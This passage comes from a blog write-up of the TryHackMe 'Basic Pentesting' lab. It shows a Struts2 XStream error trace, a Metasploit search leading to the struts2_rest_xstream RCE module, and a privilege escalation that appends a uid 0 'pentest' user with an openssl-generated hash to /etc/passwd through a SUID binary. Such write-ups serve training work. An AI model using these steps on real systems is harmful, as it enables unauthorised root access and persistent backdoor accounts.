<span style=color:#f92672>{</span>font<span style=color:#f92672>-</span>family<span style=color:#f92672>:</span>Tahoma<span style=color:#f92672>,</span>Arial<span style=color:#f92672>,</span>sans<span style=color:#f92672>-</span>serif<span style=color:#f92672>;</span>color<span style=color:#f92672>:</span>white<span style=color:#f92672>;</span>background<span style=color:#f92672>-</span>color<span style=color:#f92672>:</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>525</span>D76<span style=color:#f92672>;</span>font<span style=color:#f92672>-</span>size<span style=color:#f92672>:</span><span style=color:#ae81ff>16</span>px<span style=color:#f92672>;}</span> h3 <span style=color:#f92672>{</span>font<span style=color:#f92672>-</span>family<span style=color:#f92672>:</span>Tahoma<span style=color:#f92672>,</span>Arial<span style=color:#f92672>,</span>sans<span style=color:#f92672>-</span>serif<span style=color:#f92672>;</span>color<span style=color:#f92672>:</span>white<span style=color:#f92672>;</span>background<span style=color:#f92672>-</span>color<span style=color:#f92672>:</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>525</span>D76<span style=color:#f92672>;</span>font<span style=color:#f92672>-</span>size<span style=color:#f92672>:</span><span style=color:#ae81ff>14</span>px<span style=color:#f92672>;}</span> <span style=color:#66d9ef>body</span> <span style=color:#f92672>{</span>font<span style=color:#f92672>-</span>family<span style=color:#f92672>:</span>Tahoma<span style=color:#f92672>,</span>A
rial<span style=color:#f92672>,</span>sans<span style=color:#f92672>-</span>serif<span style=color:#f92672>;</span>color<span style=color:#f92672>:</span>black<span style=color:#f92672>;</span>background<span style=color:#f92672>-</span>color<span style=color:#f92672>:</span>white<span style=color:#f92672>;}</span> b <span style=color:#f92672>{</span>font<span style=color:#f92672>-</span>family<span style=color:#f92672>:</span>Tahoma<span style=color:#f92672>,</span>Arial<span style=color:#f92672>,</span>sans<span style=color:#f92672>-</span>serif<span style=color:#f92672>;</span>color<span style=color:#f92672>:</span>white<span style=color:#f92672>;</span>background<span style=color:#f92672>-</span>color<span style=color:#f92672>:</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>525</span>D76<span style=color:#f92672>;}</span> p <span style=color:#f92672>{</span>font<span style=color:#f92672>-</span>family<span style=color:#f92672>:</span>Tahoma<span style=color:#f92672>,</span>Arial<span style=color:#f92672>,</span>sans<span style=color:#f92672>-</span>serif<span style=color:#f92672>;</span>background<span style=color:#f92672>:</span>white<span style=color:#f92672>;</span>color<span style=color:#f92672>:</span>black<span style=color:#f92672>;</span>font<span style=color:#f92672>-</span>size<span style=color:#f92672>:</span><span style=color:#ae81ff>12</span>
px<span style=color:#f92672>;}</span> a <span style=color:#f92672>{</span>color<span style=color:#f92672>:</span>black<span style=color:#f92672>;}</span> a<span style=color:#f92672>.</span><span style=color:#a6e22e>name</span> <span style=color:#f92672>{</span>color<span style=color:#f92672>:</span>black<span style=color:#f92672>;}</span> <span style=color:#f92672>.</span><span style=color:#a6e22e>line</span> <span style=color:#f92672>{</span>height<span style=color:#f92672>:</span><span style=color:#ae81ff>1</span>px<span style=color:#f92672>;</span>background<span style=color:#f92672>-</span>color<span style=color:#f92672>:</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>525</span>D76<span style=color:#f92672>;</span>border<span style=color:#f92672>:</span>none<span style=color:#f92672>;}&lt;/</span>style<span style=color:#f92672>&gt;&lt;/</span>head<span style=color:#f92672>&gt;&lt;</span><span style=color:#66d9ef>body</span><span style=color:#f92672>&gt;&lt;</span>h1<span style=color:#f92672>&gt;</span>HTTP Status <span style=color:#ae81ff>500</span> <span style=color:#960050;background-color:#1e0010>‚Äì</span> Internal Server Error<span style=color:#f92672>&lt;/</span>h1<span style=color:#f92672>&gt;&lt;</span>hr class<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;line&#34;</span> <span style=color:#f92672>/&gt;&lt;</span>p<span style=color:#f92672>&gt;&lt;</span>b<span style=color:#f92672>&gt;</span>Type<span style=color:#f92672>&lt;/</span>b<span style=color:#f92672>&gt;</span> Exceptio
n Report<span style=color:#f92672>&lt;/</span>p<span style=color:#f92672>&gt;&lt;</span>p<span style=color:#f92672>&gt;&lt;</span>b<span style=color:#f92672>&gt;</span>Message<span style=color:#f92672>&lt;/</span>b<span style=color:#f92672>&gt;</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span> cannot be <span style=color:#66d9ef>cast</span> to java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Provider$Service</span> <span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span> cannot be <span style=color:#66d9ef>cast</span> to java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Provider$Service</span><span style=color:#f92672>&lt;/</span>p<span style=color:#f92672>&gt;&lt;</span>p<span style=color:#f92672>&gt;&lt;</span>b<span style=color:#f92672>&gt;</span>Description<span style=color:#f92672>&lt;/</span>b<span style=color:#f92672>&gt;</span> The server encountered
 an unexpected condition that prevented it from fulfilling the request<span style=color:#f92672>.&lt;/</span>p<span style=color:#f92672>&gt;&lt;</span>p<span style=color:#f92672>&gt;&lt;</span>b<span style=color:#f92672>&gt;</span>Exception<span style=color:#f92672>&lt;/</span>b<span style=color:#f92672>&gt;&lt;/</span>p<span style=color:#f92672>&gt;&lt;</span>pre<span style=color:#f92672>&gt;</span>com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>converters</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ConversionException</span><span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span> cannot be <span style=color:#66d9ef>cast</span> to java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Pr</span>
ovider$Service <span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span> cannot be <span style=color:#66d9ef>cast</span> to java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Provider$Service</span>                    
<span style=color:#f92672>----</span> Debugging information <span style=color:#f92672>----</span>                                                                                                                                                                                    
message             <span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span> cannot be <span style=color:#66d9ef>cast</span> to java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Provider$Service</span>         
cause<span style=color:#f92672>-</span>exception     <span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ClassCastException</span>                                                                                                                                                                 
cause<span style=color:#f92672>-</span>message       <span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>lang</span><span style=color:#f92672>.</span><span style=color:#a6e22e>String</span> cannot be <span style=color:#66d9ef>cast</span> to java<span style=color:#f92672>.</span><span style=color:#a6e22e>security</span><span style=color:#f92672>.</span><span style=color:#a6e22e>Provider$Service</span>                                                                                                                            
<span style=color:#66d9ef>class</span>               <span style=color:#960050;background-color:#1e0010>: </span><span style=color:#a6e22e>java</span><span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>HashMap</span>                                                                  
required<span style=color:#f92672>-</span>type       <span style=color:#f92672>:</span> java<span style=color:#f92672>.</span><span style=color:#a6e22e>util</span><span style=color:#f92672>.</span><span style=color:#a6e22e>HashMap</span>                                                                  
converter<span style=color:#f92672>-</span>type      <span style=color:#f92672>:</span> com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>converters</span><span style=color:#f92672>.</span><span style=color:#a6e22e>collections</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MapConverter</span>                                                                                                                                 
path                <span style=color:#f92672>:</span> <span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>47</span><span style=color:#f92672>;</span>map<span style=color:#f92672>&amp;</span><span style=color:#960050;background-color:#1e0010>#</span><span style=color:#ae81ff>47</span><span style=color:#f92672>;</span>entry                                                                 
line number         <span style=color:#f92672>:</span> <span style=color:#ae81ff>49</span>                                                                                 
<span style=color:#66d9ef>version</span>             <span style=color:#f92672>:</span> <span style=color:#ae81ff>1.4</span><span style=color:#f92672>.</span><span style=color:#a6e22e>8</span>                                                                                                                                                                                        
<span style=color:#f92672>-------------------------------</span>                                                                          
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>TreeUnmarshaller</span><span style=color:#f92672>.</span><span style=color:#a6e22e>convert</span><span style=color:#f92672>(</span>TreeUnmarshaller<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>79</span><span style=color:#f92672>)</span>        
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AbstractReferenceUnmarshaller</span><span style=color:#f92672>.</span><span style=color:#a6e22e>convert</span><span style=color:#f92672>(</span>AbstractReferenceUnmarshaller<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>65</span><span style=color:#f92672>)</span>
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>TreeUnmarshaller</span><span style=color:#f92672>.</span><span style=color:#a6e22e>convertAnother</span><span style=color:#f92672>(</span>TreeUnmarshaller<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>66</span><span style=color:#f92672>)</span>                                                                                                                    
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>TreeUnmarshaller</span><span style=color:#f92672>.</span><span style=color:#a6e22e>convertAnother</span><span style=color:#f92672>(</span>TreeUnmarshaller<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>50</span><span style=color:#f92672>)</span>                                                                                                                    
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>TreeUnmarshaller</span><span style=color:#f92672>.</span><span style=color:#a6e22e>start</span><span style=color:#f92672>(</span>TreeUnmarshaller<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>134</span><span style=color:#f92672>)</span>                                                                                                                            
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>core</span><span style=color:#f92672>.</span><span style=color:#a6e22e>AbstractTreeMarshallingStrategy</span><span style=color:#f92672>.</span><span style=color:#a6e22e>unmarshal</span><span style=color:#f92672>(</span>AbstractTreeMarshallingStrategy<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>32</span><span style=color:#f92672>)</span>
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>XStream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>unmarshal</span><span style=color:#f92672>(</span>XStream<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1206</span><span style=color:#f92672>)</span>                           
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>XStream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>unmarshal</span><span style=color:#f92672>(</span>XStream<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1190</span><span style=color:#f92672>)</span>                                                                                                                                              
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>thoughtworks</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xstream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>XStream</span><span style=color:#f92672>.</span><span style=color:#a6e22e>fromXML</span><span style=color:#f92672>(</span>XStream<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>1120</span><span style=color:#f92672>)</span>                                                                                                                                                
        org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>struts2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>rest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>handler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>XStreamHandler</span><span style=color:#f92672>.</span><span style=color:#a6e22e>toObject</span><span style=color:#f92672>(</span>XStreamHandler<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>45</span><span style=color:#f92672>)</span>         
        org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>struts2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>rest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ContentTypeInterceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>intercept</span><span style=color:#f92672>(</span>ContentTypeInterceptor<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>60</span><span style=color:#f92672>)</span>                                                                                                                   
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>opensymphony</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xwork2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>DefaultActionInvocation</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>DefaultActionInvocation<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>247</span><span style=color:#f92672>)</span>                                                                                                                   
        org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>struts2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>rest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RestActionInvocation</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>RestActionInvocation<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>135</span><span style=color:#f92672>)</span>      
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>opensymphony</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xwork2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>ParametersInterceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>doIntercept</span><span style=color:#f92672>(</span>ParametersInterceptor<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>134</span><span style=color:#f92672>)</span>
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>opensymphony</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xwork2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>MethodFilterInterceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>intercept</span><span style=color:#f92672>(</span>MethodFilterInterceptor<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>98</span><span style=color:#f92672>)</span>         
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>opensymphony</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xwork2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>DefaultActionInvocation</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>DefaultActionInvocation<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>247</span><span style=color:#f92672>)</span>
        org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>struts2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>rest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RestActionInvocation</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>RestActionInvocation<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>135</span><span style=color:#f92672>)</span>
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>opensymphony</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xwork2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>interceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>StaticParametersInterceptor</span><span style=color:#f92672>.</span><span style=color:#a6e22e>intercept</span><span style=color:#f92672>(</span>StaticParametersInterceptor<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>199</span><span style=color:#f92672>)</span>
        com<span style=color:#f92672>.</span><span style=color:#a6e22e>opensymphony</span><span style=color:#f92672>.</span><span style=color:#a6e22e>xwork2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>DefaultActionInvocation</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>DefaultActionInvocation<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>247</span><span style=color:#f92672>)</span>
        org<span style=color:#f92672>.</span><span style=color:#a6e22e>apache</span><span style=color:#f92672>.</span><span style=color:#a6e22e>struts2</span><span style=color:#f92672>.</span><span style=color:#a6e22e>rest</span><span style=color:#f92672>.</span><span style=color:#a6e22e>RestActionInvocation</span><span style=color:#f92672>.</span><span style=color:#a6e22e>invoke</span><span style=color:#f92672>(</span>RestActionInvocation<span style=color:#f92672>.</span><span style=color:#a6e22e>java</span><span style=color:#f92672>:</span><span style=color:#ae81ff>135</span><span style=color:#f92672>)</span>
</code></pre></div><p>Alright, <code>errors</code> üòÖ ‚Äî Let&rsquo;s try good ol' <code>metasploit</code> maybe? Because it also contains a exploit for this.</p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>msf6 <span style=color:#f92672>&gt;</span> search struts

Matching Modules
<span style=color:#f92672>================</span>

   <span style=color:#960050;background-color:#1e0010>#</span>   Name                                                     Disclosure Date  Rank       Check  Description
   <span style=color:#f92672>-</span>   <span style=color:#f92672>----</span>                                                     <span style=color:#f92672>---------------</span>  <span style=color:#f92672>----</span>       <span style=color:#f92672>-----</span>  <span style=color:#f92672>-----------</span>
   <span style=color:#ae81ff>0</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts2_code_exec_showcase            <span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>07</span><span style=color:#f92672>-</span><span style=color:#ae81ff>07</span>       excellent  Yes    Apache Struts <span style=color:#ae81ff>2</span> Struts <span style=color:#ae81ff>1</span> Plugin Showcase OGNL Code Execution
   <span style=color:#ae81ff>1</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts2_content_type_ognl             <span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>03</span><span style=color:#f92672>-</span><span style=color:#ae81ff>07</span>       excellent  Yes    Apache Struts Jakarta Multipart Parser OGNL Injection
   <span style=color:#ae81ff>2</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts2_multi_eval_ognl               <span style=color:#ae81ff>2020</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>14</span>       excellent  Yes    Apache Struts <span style=color:#ae81ff>2</span> Forced Multi OGNL Evaluation
   <span style=color:#ae81ff>3</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts2_namespace_ognl                <span style=color:#ae81ff>2018</span><span style=color:#f92672>-</span><span style=color:#ae81ff>08</span><span style=color:#f92672>-</span><span style=color:#ae81ff>22</span>       excellent  Yes    Apache Struts <span style=color:#ae81ff>2</span> Namespace Redirect OGNL Injection
   <span style=color:#ae81ff>4</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts2_rest_xstream                  <span style=color:#ae81ff>2017</span><span style=color:#f92672>-</span><span style=color:#ae81ff>09</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span>       excellent  Yes    Apache Struts <span style=color:#ae81ff>2</span> REST Plugin XStream RCE
   <span style=color:#ae81ff>5</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_code_exec                      <span style=color:#ae81ff>2010</span><span style=color:#f92672>-</span><span style=color:#ae81ff>07</span><span style=color:#f92672>-</span><span style=color:#ae81ff>13</span>       good       No     Apache Struts Remote Command Execution
   <span style=color:#ae81ff>6</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_code_exec_classloader          <span style=color:#ae81ff>2014</span><span style=color:#f92672>-</span><span style=color:#ae81ff>03</span><span style=color:#f92672>-</span><span style=color:#ae81ff>06</span>       manual     No     Apache Struts ClassLoader Manipulation Remote Code Execution
   <span style=color:#ae81ff>7</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_code_exec_exception_delegator  <span style=color:#ae81ff>2012</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#f92672>-</span><span style=color:#ae81ff>06</span>       excellent  No     Apache Struts Remote Command Execution
   <span style=color:#ae81ff>8</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_code_exec_parameters           <span style=color:#ae81ff>2011</span><span style=color:#f92672>-</span><span style=color:#ae81ff>10</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span>       excellent  Yes    Apache Struts ParametersInterceptor Remote Code Execution
   <span style=color:#ae81ff>9</span>   exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_default_action_mapper          <span style=color:#ae81ff>2013</span><span style=color:#f92672>-</span><span style=color:#ae81ff>07</span><span style=color:#f92672>-</span><span style=color:#ae81ff>02</span>       excellent  Yes    Apache Struts <span style=color:#ae81ff>2</span> DefaultActionMapper Prefixes OGNL Code Execution
   <span style=color:#ae81ff>10</span>  exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_dev_mode                       <span style=color:#ae81ff>2012</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span><span style=color:#f92672>-</span><span style=color:#ae81ff>06</span>       excellent  Yes    Apache Struts <span style=color:#ae81ff>2</span> Developer Mode OGNL Execution
   <span style=color:#ae81ff>11</span>  exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_dmi_exec                       <span style=color:#ae81ff>2016</span><span style=color:#f92672>-</span><span style=color:#ae81ff>04</span><span style=color:#f92672>-</span><span style=color:#ae81ff>27</span>       excellent  Yes    Apache Struts Dynamic Method Invocation Remote Code Execution
   <span style=color:#ae81ff>12</span>  exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_dmi_rest_exec                  <span style=color:#ae81ff>2016</span><span style=color:#f92672>-</span><span style=color:#ae81ff>06</span><span style=color:#f92672>-</span><span style=color:#ae81ff>01</span>       excellent  Yes    Apache Struts REST Plugin With Dynamic Method Invocation Remote Code Execution
   <span style=color:#ae81ff>13</span>  exploit<span style=color:#f92672>/</span>multi<span style=color:#f92672>/</span>http<span style=color:#f92672>/</span>struts_include_params                 <span style=color:#ae81ff>2013</span><span style=color:#f92672>-</span><span style=color:#ae81ff>05</span><span style=color:#f92672>-</span><span style=color:#ae81ff>24</span>       great      Yes    Apache Struts includeParams Remote Code Execution
</code></pre></div><p>We can use <code>exploit/multi/http/struts2_rest_xstream</code></p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%208.png alt=/images/thm-basic_pentesting/Untitled%208.png></p><p><strong>Yosh, RCE</strong>! ü§§</p><p>Now let&rsquo;s get to <code>privesc</code> after getting an <code>interactive shell</code> (will leave this upto you to figure out)</p><p>Let&rsquo;s run <code>linpeas.sh</code> and see what we can use to privesc now! ‚Äî Skipping results</p><p>Ran <a href=https://github.com/Anon-Exploiter/SUID3NUM>SUID3NUM</a> against the machine and found out an interesting binary (which we missed in <code>linpeas</code>, results hahaha :feels-embarrased-man xD)</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%209.png alt=/images/thm-basic_pentesting/Untitled%209.png></p><p>We can add the following one liner in <code>/etc/passwd</code> end and get our user new user <code>pentest</code> with password <code>pentest123</code> with <code>uid and gid 0 ‚Üí root</code></p><p>Let&rsquo;s generate password compatible for <code>/etc/passwd</code></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>tomcat9<span style=color:#a6e22e>@basic2</span><span style=color:#f92672>:/</span>$ openssl passwd <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>-</span>salt pentest pentest123
$1$pentest$DBbvyULdY7MsoZ7AcK8ew<span style=color:#f92672>/</span>
</code></pre></div><p>Let&rsquo;s add the following in the end of <em><code>/etc/passwd</code></em></p><div class=highlight><pre style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-d data-lang=d>pentest:$1$pentest$DBbvyULdY7MsoZ7AcK8ew<span style=color:#f92672>/:</span><span style=color:#ae81ff>0</span><span style=color:#f92672>:</span><span style=color:#ae81ff>0</span><span style=color:#f92672>::/</span>root<span style=color:#f92672>:/</span>bin<span style=color:#f92672>/</span>bash
</code></pre></div><p><strong>Format is:</strong></p><p><code>username:passwordHash:uid:gid:userDescription:homeDirectory:shell</code></p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%2010.png alt=/images/thm-basic_pentesting/Untitled%2010.png></p><p>I&rsquo;ll leave it to to you to figure out how to exim vim! üòõ</p><p>Aaaand, we&rsquo;re root yet again! XD</p><p><img loading=lazy src=/images/thm-basic_pentesting/Untitled%2011.png alt=/images/thm-basic_pentesting/Untitled%2011.png></p><hr><h2 id=things-learnt>Things learnt:<a hidden class=anchor aria-hidden=true href=#things-learnt>#</a></h2><ul><li>Be patient while <code>bruteforcing</code> (if it&rsquo;s <code>SSH</code> or any other slow protocol)</li><li>Remember to <em>enumerate every port</em> and <em>try all relevant enumeration scripts</em>!</li><li>Check all open ports! üòê</li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=https://umar0x01.sh/tags/ssh/>ssh</a></li><li><a href=https://umar0x01.sh/tags/http/>http</a></li><li><a href=https://umar0x01.sh/tags/smb/>smb</a></li><li><a href=https://umar0x01.sh/tags/nmap/>nmap</a></li><li><a href=https://umar0x01.sh/tags/gobuster/>gobuster</a></li><li><a href=https://umar0x01.sh/tags/bruteforcing/>bruteforcing</a></li><li><a href=https://umar0x01.sh/tags/cracking/>cracking</a></li><li><a href=https://umar0x01.sh/tags/linpeas/>linpeas</a></li><li><a href=https://umar0x01.sh/tags/privesc/>privesc</a></li><li><a href=https://umar0x01.sh/tags/struts2/>struts2</a></li><li><a href=https://umar0x01.sh/tags/suid3num/>suid3num</a></li><li><a href=https://umar0x01.sh/tags/openssl/>openssl</a></li></ul><nav class=paginav><a class=prev href=https://umar0x01.sh/post/vulnversity-thm/><span class=title>¬´ Prev Page</span><br><span>TryHackMe - Vulnversity</span></a>
